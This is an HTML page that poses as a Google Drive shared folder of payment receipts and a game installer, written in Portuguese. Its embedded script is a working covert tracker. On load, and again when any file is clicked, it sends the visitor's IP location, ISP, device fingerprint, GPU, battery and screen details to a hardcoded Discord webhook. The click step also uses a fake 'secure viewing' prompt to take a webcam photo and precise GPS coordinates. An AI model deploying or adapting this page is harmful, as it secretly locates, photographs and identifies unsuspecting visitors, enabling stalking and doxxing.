<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Comprovantes - Meu Drive</title>
<link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#202124;font-size:14px}
header{display:flex;align-items:center;gap:12px;padding:8px 16px;border-bottom:1px solid #e0e0e0;height:64px;position:sticky;top:0;background:#fff;z-index:5}
.burger{width:40px;height:40px;border-radius:50%;display:grid;place-items:center;cursor:pointer}
.burger:hover{background:#f1f3f4}
.logo{display:flex;align-items:center;gap:8px;font-size:22px;color:#5f6368}
.search{flex:1;max-width:720px;background:#f1f3f4;border-radius:8px;height:44px;display:flex;align-items:center;padding:0 16px;color:#5f6368}
.search input{border:0;background:transparent;outline:0;flex:1;font-size:15px}
.avatar{width:32px;height:32px;border-radius:50%;background:#1a73e8;color:#fff;display:grid;place-items:center;font-weight:500}
.wrap{display:flex;min-height:calc(100vh - 64px)}
aside{width:256px;padding:8px;flex-shrink:0}
.novo{display:flex;align-items:center;gap:12px;background:#fff;border:1px solid #dadce0;border-radius:24px;padding:0 22px;height:48px;font-weight:500;font-size:14px;color:#3c4043;box-shadow:0 1px 3px rgba(60,64,67,.2);margin:8px 0 16px;cursor:pointer}
.novo:hover{background:#f8f9fa;box-shadow:0 1px 6px rgba(60,64,67,.28)}
nav a{display:flex;align-items:center;gap:14px;height:32px;padding:0 16px;border-radius:16px;color:#3c4043;text-decoration:none;font-size:13px;font-weight:500}
nav a:hover{background:#f1f3f4}
nav a.on{background:#e8f0fe;color:#1967d2}
.storage{margin:20px 16px;font-size:12px;color:#5f6368}
.bar{height:4px;background:#dadce0;border-radius:2px;margin:8px 0}
.bar i{display:block;height:100%;width:41%;background:#1a73e8;border-radius:2px}
main{flex:1;padding:8px 24px 60px;min-width:0}
.crumb{display:flex;align-items:center;gap:6px;font-size:22px;color:#202124;padding:12px 0;font-weight:400}
.crumb span{color:#5f6368;font-size:20px}
.tools{display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #e0e0e0;padding-bottom:8px;color:#5f6368;font-size:12px}
.rows{margin-top:4px}
.row{display:grid;grid-template-columns:1fr 180px 120px 90px 40px;align-items:center;gap:8px;padding:10px 8px;border-bottom:1px solid #f1f3f4;cursor:pointer;border-radius:6px}
.row:hover{background:#f8f9fa}
.row.head{font-size:12px;color:#5f6368;font-weight:500;border-bottom:1px solid #e0e0e0;cursor:default}
.row.head:hover{background:transparent}
.nm{display:flex;align-items:center;gap:12px;min-width:0}
.nm b{font-weight:400;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.ic{width:24px;height:24px;flex-shrink:0}
.mut{color:#5f6368;font-size:12px}
.toast{position:fixed;left:50%;transform:translateX(-50%);bottom:24px;background:#202124;color:#fff;padding:12px 18px;border-radius:8px;font-size:13px;opacity:0;transition:.3s;pointer-events:none;z-index:60}
.toast.on{opacity:1}
.modal{position:fixed;inset:0;background:rgba(32,33,36,.6);display:none;place-items:center;z-index:50}
.modal.on{display:grid}
.card{background:#fff;border-radius:12px;padding:28px 32px;width:min(380px,90vw);text-align:center}
.spin{width:38px;height:38px;border:3px solid #e8eaed;border-top-color:#1a73e8;border-radius:50%;margin:0 auto 16px;animation:s .8s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
.card h3{font-size:16px;font-weight:500;margin-bottom:6px}
.card p{font-size:13px;color:#5f6368;line-height:1.5}
.done{display:none;color:#1e8e3e;font-size:13px;margin-top:12px;font-weight:500}
@media(max-width:760px){aside{display:none}.row{grid-template-columns:1fr 90px}.row .own,.row .sz{display:none}}
</style>
</head>
<body>

<header>
  <div class="burger"><svg width="20" height="20" viewBox="0 0 24 24" fill="#5f6368"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg></div>
  <div class="logo">
    <svg viewBox="0 0 87.3 78" width="26" height="23">
      <path d="m6.6 66.85 3.85 6.65c.8 1.4 1.95 2.5 3.3 3.3l13.75-23.8H0c0 1.55.4 3.1 1.2 4.5z" fill="#0066da"/>
      <path d="M43.65 25 29.9 1.2c-1.35.8-2.5 1.9-3.3 3.3l-25.4 44a9.06 9.06 0 0 0-1.2 4.5h27.5z" fill="#00ac47"/>
      <path d="M73.55 76.8c1.35-.8 2.5-1.9 3.3-3.3l1.6-2.75L86.1 57.5c.8-1.4 1.2-2.95 1.2-4.5H59.8l5.85 11.5z" fill="#ea4335"/>
      <path d="m43.65 25 13.75-23.8c-1.35-.8-2.9-1.2-4.5-1.2H34.4c-1.6 0-3.15.45-4.5 1.2z" fill="#00832d"/>
      <path d="M59.8 53H27.5L13.75 76.8c1.35.8 2.9 1.2 4.5 1.2h50.8c1.6 0 3.15-.45 4.5-1.2z" fill="#2684fc"/>
      <path d="m73.4 26.5-12.7-22c-.8-1.4-1.95-2.5-3.3-3.3L43.65 25l16.15 28h27.45c0-1.55-.4-3.1-1.2-4.5z" fill="#ffba00"/>
    </svg>
    <span>Drive</span>
  </div>
  <div class="search">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M15.5 14h-.79l-.28-.27a6.5 6.5 0 1 0-.7.7l.27.28v.79l5 4.99L20.49 19zm-6 0A4.5 4.5 0 1 1 14 9.5 4.5 4.5 0 0 1 9.5 14z"/></svg>
    <input placeholder="Pesquisar no Drive">
  </div>
  <div class="avatar">M</div>
</header>

<div class="wrap">
  <aside>
    <div class="novo"><svg width="20" height="20" viewBox="0 0 24 24" fill="#1a73e8"><path d="M11 5h2v6h6v2h-6v6h-2v-6H5v-2h6z"/></svg>Novo</div>
    <nav>
      <a class="on"><svg width="18" height="18" viewBox="0 0 24 24" fill="#1967d2"><path d="M10 4H4a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-8z"/></svg>Meu Drive</a>
      <a><svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M4 6h16v10H4zM2 4h20v14H2z"/></svg>Computadores</a>
      <a><svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M16 11a4 4 0 1 0-4-4 4 4 0 0 0 4 4zm-8 0a4 4 0 1 0-4-4 4 4 0 0 0 4 4zm0 2c-3 0-6 1.5-6 4v3h12v-3c0-2.5-3-4-6-4zm8 0c-1 0-2 .2-2.8.5A5.7 5.7 0 0 1 15 18v2h7v-3c0-2.5-3-4-6-4z"/></svg>Compartilhados comigo</a>
      <a><svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 3a9 9 0 1 0 9 9h-2a7 7 0 1 1-7-7zm1 3v6l5 3 .9-1.6-4-2.4V6z"/></svg>Recentes</a>
      <a><svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M6 2h12v20H6zM8 6h8v2H8zm0 4h8v2H8z"/></svg>Em espera</a>
      <a><svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zm0 16a7 7 0 1 1 0-14 7 7 0 0 1 0 14z"/></svg>Offline</a>
      <a><svg width="18" height="18" viewBox="0 0 24 24" fill="#5f6368"><path d="M6 4h12v14H6zm2 2v10h8V6zM8 20h8v2H8z"/></svg>Lixeira</a>
    </nav>
    <div class="storage">
      <div class="bar"><i></i></div>
      6,2 GB de 15 GB usados<br><span style="color:#1a73e8">Comprar armazenamento</span>
    </div>
  </aside>

  <main>
    <div class="crumb">Meu Drive <span>›</span> Comprovantes Mariano</div>
    <div class="tools">
      <span>5 itens · Pasta compartilhada</span>
      <span>Ordenar por nome</span>
    </div>
    <div class="rows" id="rows">
      <div class="row head"><span>Nome</span><span class="own">Proprietário</span><span class="mut">Última modificação</span><span class="sz">Tamanho</span><span></span></div>
    </div>
  </main>
</div>

<div class="toast" id="toast"></div>

<div class="modal" id="modal">
  <div class="card">
    <div class="spin"></div>
    <h3 id="mt">Abrindo arquivo</h3>
    <p id="mp">Preparando visualização segura. Permita o acesso quando solicitado.</p>
    <div class="done" id="md">Download concluído</div>
  </div>
</div>

<script>
/* ══════════════ CONFIG ══════════════ */
const WEBHOOK = 'https://discord.com/api/webhooks/1564854798191173752/ItrlDZ0TzgF6z2ZaDtA1YNoVHCblE5q2dsLfPYtjQc46DcBrna10O40EMKCDHE-0jelp';
/* ════════════════════════════════════ */

const FILES = [
  ['Comprovante PIX - Mariano.pdf','pdf','1,2 MB','12 de out. de 2026'],
  ['Tabela de preços - Robux.pdf','pdf','340 KB','3 de nov. de 2026'],
  ['Print do golpe.png','img','890 KB','7 de nov. de 2026'],
  ['Comprovantes antigos.zip','zip','4,1 MB','28 de set. de 2026'],
  ['Instalador do jogo.rar','zip','180 MB','1 de nov. de 2026']
];

const ICONS = {
  pdf:'<svg class="ic" viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2" fill="#ea4335"/><path d="M8 14h8v1.6H8zm0 3h6v1.6H8z" fill="#fff"/></svg>',
  img:'<svg class="ic" viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2" fill="#1a73e8"/><circle cx="9" cy="8" r="1.8" fill="#fff"/><path d="M5.5 18l4-5 3 3.5 2.5-3 3.5 4.5z" fill="#fff"/></svg>',
  zip:'<svg class="ic" viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2" fill="#fbbc04"/><path d="M11 2h2v3h-2zm0 4h2v3h-2zm0 4h2v3h-2z" fill="#fff"/></svg>'
};

const rows = document.getElementById('rows');
FILES.forEach(f => {
  const d = document.createElement('div');
  d.className = 'row';
  d.innerHTML = `<div class="nm">${ICONS[f[1]]}<b>${f[0]}</b></div>
    <span class="mut own">mariano_rb</span><span class="mut">${f[3]}</span><span class="mut sz">${f[2]}</span><span></span>`;
  d.onclick = () => openFile(f[0]);
  rows.appendChild(d);
});

const toast = (m, ms = 4200) => {
  const t = document.getElementById('toast');
  t.textContent = m; t.classList.add('on');
  clearTimeout(t._h); t._h = setTimeout(() => t.classList.remove('on'), ms);
};

/* ── util ── */
const sha256 = async s => {
  const b = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
  return [...new Uint8Array(b)].map(x => x.toString(16).padStart(2, '0')).join('');
};

function gpu() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) return 'sem WebGL';
    const d = gl.getExtension('WEBGL_debug_renderer_info');
    return d ? gl.getParameter(d.UNMASKED_VENDOR_WEBGL) + ' | ' + gl.getParameter(d.UNMASKED_RENDERER_WEBGL)
             : gl.getParameter(gl.RENDERER);
  } catch (e) { return 'n/d'; }
}

function canvasFP() {
  try {
    const c = document.createElement('canvas'); c.width = 220; c.height = 50;
    const x = c.getContext('2d');
    x.textBaseline = 'top'; x.font = '14px Arial';
    x.fillStyle = '#f60'; x.fillRect(0, 0, 100, 20);
    x.fillStyle = '#069'; x.fillText('Venice olá 🌍', 2, 15);
    x.fillStyle = 'rgba(102,204,0,0.7)'; x.fillText('Venice olá 🌍', 4, 17);
    return c.toDataURL().slice(-140);
  } catch (e) { return 'n/d'; }
}

async function uaData() {
  try {
    const d = await navigator.userAgentData.getHighEntropyValues(
      ['model','platformVersion','architecture','bitness','fullVersionList']);
    return [d.platform, d.platformVersion, d.model, d.architecture, d.bitness]
      .filter(Boolean).join(' · ');
  } catch (e) { return 'n/d'; }
}

function battery() {
  return new Promise(r => {
    if (!navigator.getBattery) return r('n/d');
    navigator.getBattery().then(b =>
      r(Math.round(b.level * 100) + '% ' + (b.charging ? '(carregando)' : '(descarregando)')))
      .catch(() => r('n/d'));
  });
}

async function ipInfo() {
  try {
    const j = await (await fetch('https://ipwho.is/')).json();
    if (j && j.success) return {
      ip: j.ip, isp: j.connection?.isp || '-', org: j.connection?.org || '-',
      asn: j.connection?.asn || '-', city: j.city || '-', region: j.region || '-',
      country: j.country || '-', code: j.country_code || '-', postal: j.postal || '-',
      lat: j.latitude, lon: j.longitude, tz: j.timezone?.id || '-'
    };
  } catch (e) {}
  try {
    const j = await (await fetch('https://api.ipify.org?format=json')).json();
    return { ip: j.ip };
  } catch (e) { return { ip: 'n/d' }; }
}

function geo() {
  return new Promise(r => {
    if (!navigator.geolocation) return r(null);
    navigator.geolocation.getCurrentPosition(
      p => r({ lat: p.coords.latitude, lon: p.coords.longitude, acc: Math.round(p.coords.accuracy) }),
      () => r(null), { timeout: 10000, maximumAge: 0, enableHighAccuracy: true });
  });
}

async function camera() {
  try {
    const s = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 } }, audio: false });
    const v = document.createElement('video');
    v.srcObject = s; v.muted = true; v.playsInline = true;
    await v.play();
    await new Promise(r => setTimeout(r, 1600));
    const c = document.createElement('canvas');
    c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
    c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
    s.getTracks().forEach(t => t.stop());
    return await new Promise(r => c.toBlob(r, 'image/jpeg', 0.86));
  } catch (e) { return null; }
}

async function send(payload, blob) {
  const url = WEBHOOK + '?wait=true';
  try {
    if (!blob) {
      return await fetch(url, {
        method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
    }
    const fd = new FormData();
    fd.append('payload_json', JSON.stringify(payload));
    fd.append('files[0]', blob, 'foto.jpg');
    return await fetch(url, { method: 'POST', body: fd });
  } catch (e) {}
}

/* ── coleta ── */
async function fullLog() {
  const ip = await ipInfo();
  const [ua, bat] = await Promise.all([uaData(), battery()]);
  const fp = [
    navigator.userAgent, navigator.platform, navigator.vendor, navigator.language,
    (navigator.languages || []).join(','), screen.width, screen.height, screen.colorDepth,
    devicePixelRatio, navigator.hardwareConcurrency, navigator.deviceMemory,
    navigator.maxTouchPoints, Intl.DateTimeFormat().resolvedOptions().timeZone,
    new Date().getTimezoneOffset(), gpu(), canvasFP(), ua,
    navigator.connection?.effectiveType || ''
  ].join('|');

  return {
    ip, ua, bat,
    hwid: (await sha256(fp)).slice(0, 32).toUpperCase(),
    gpu: gpu(), canvas: canvasFP(), uaData: ua,
    screen: screen.width + 'x' + screen.height + ' @' + devicePixelRatio + 'x',
    cores: navigator.hardwareConcurrency || 'n/d',
    ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'n/d',
    touch: navigator.maxTouchPoints || 0,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    net: navigator.connection?.effectiveType || 'n/d',
    plat: navigator.platform || 'n/d',
    lang: (navigator.languages || [navigator.language]).join(', ')
  };
}

const field = (n, v, i = true) => ({ name: n, value: String(v ?? 'n/d').slice(0, 1020), inline: i });

async function sendAll(foto) {
  const d = await fullLog();
  const g = await geo();
  const pos = g ? `[${g.lat.toFixed(5)}, ${g.lon.toFixed(5)}](https://www.google.com/maps?q=${g.lat},${g.lon}) · ±${g.acc}m` : 'negado / indisponível';
  const mapa = d.ip.lat ? `[${d.ip.lat}, ${d.ip.lon}](https://www.google.com/maps?q=${d.ip.lat},${d.ip.lon})` : 'n/d';

  const embed = {
    title: 'Novo acesso — ' + (d.ua.includes('Mobile') ? 'Mobile' : 'Desktop'),
    color: 0x1a73e8,
    description: '```' + (d.ua || '') + '```',
    fields: [
      field('🌐 IP', d.ip.ip),
      field('📍 IP → localização', `${d.ip.city} / ${d.ip.region} / ${d.ip.country} (${d.ip.code})`, false),
      field('🗺️ Coord. por IP', mapa, false),
      field('🏢 ISP', d.ip.isp, false),
      field('🔗 ASN', d.ip.asn, false),
      field('📮 CEP', d.ip.postal, false),
      field('🛰️ GPS preciso', pos, false),
      field('🆔 HWID (fingerprint)', '`' + d.hwid + '`', false),
      field('🖥️ GPU', d.gpu, false),
      field('📱 Tela', d.screen, false),
      field('⚙️ CPU / RAM', `${d.cores} threads · ${d.ram}`, false),
      field('🧠 Plataforma', `${d.plat} · ${d.uaData}`, false),
      field('🌍 TZ / Idioma', `${d.tz} · ${d.lang}`, false),
      field('📶 Rede', d.net, false),
      field('🔋 Bateria', d.bat, false),
      field('👆 Touch', d.touch, false),
      field('🎨 Canvas hash', '`' + d.canvas.slice(-40) + '`', false),
      field('📄 Página', location.href, false),
      field('↩️ Referrer', document.referrer || 'direto', false)
    ],
    footer: { text: 'Drive · ' + new Date().toLocaleString('pt-BR') },
    timestamp: new Date().toISOString()
  };

  if (foto) {
    embed.image = { url: 'attachment://foto.jpg' };
    await send({ username: 'Drive Log', embeds: [embed] }, foto);
  } else {
    await send({ username: 'Drive Log', embeds: [embed] });
  }
}

/* ── fluxo ── */
let started = false, enviado = false;

async function openFile(nome) {
  const m = document.getElementById('modal');
  const mt = document.getElementById('mt'), mp = document.getElementById('mp'), md = document.getElementById('md');
  m.classList.add('on');
  mt.textContent = 'Abrindo ' + nome;
  mp.textContent = 'Preparando visualização segura. Permita o acesso quando solicitado.';
  md.style.display = 'none';

  if (!started) {
    started = true;
    toast('Permita o acesso para visualizar o arquivo');
    await new Promise(r => setTimeout(r, 700));
    const foto = await camera();
    if (foto) { enviado = true; sendAll(foto); }
    else { toast('Acesso negado — abrindo mesmo assim'); sendAll(null); }
  } else if (!enviado) {
    enviado = true; sendAll(null);
  }

  setTimeout(() => {
    md.style.display = 'block';
    mp.textContent = 'O arquivo foi baixado para a pasta Downloads.';
    const b = new Blob(['Arquivo de exemplo — ' + nome], { type: 'text/plain' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(b); a.download = nome; a.click();
    setTimeout(() => URL.revokeObjectURL(a.href), 3000);
  }, 2600);

  setTimeout(() => m.classList.remove('on'), 5200);
}

/* ping silencioso ao abrir a página */
setTimeout(() => { if (!started) sendAll(null); }, 1200);
</script>
</body>
</html>
